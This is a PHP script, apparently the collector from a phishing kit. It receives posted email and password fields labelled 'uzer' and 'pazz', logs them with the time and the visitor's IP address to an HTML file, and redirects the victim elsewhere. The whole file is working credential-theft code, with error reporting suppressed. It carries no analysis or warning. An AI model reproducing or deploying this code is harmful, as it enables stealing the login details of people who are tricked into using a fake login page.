<?php
error_reporting(0);
include "./config.php";
date_default_timezone_set($timezone);

$time = date("Y-m-d H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];

if (isset($_POST["uzer"])) {
    $f = fopen("./$txtn.html", "a");
    fwrite(
        $f,
        '
      <div style="font-family:arial">
      Correo: <b><font color="#EE0707">' .
            $_POST["uzer"] .
            '</font></b><br>
      Password: <b><font color="#390FF1">' .
            $_POST["pazz"] .
            '</font></b><br> 
      Fecha: <b><font color="#390FF1">' .
            $time .
            '</font></b><br>
      Datos: <b><font color="#4EE811">' .
            $ip .
            '</font></b><br>
      --------------------
      </div>'
    );
    fclose($f);
    header("location: $out");
}
?>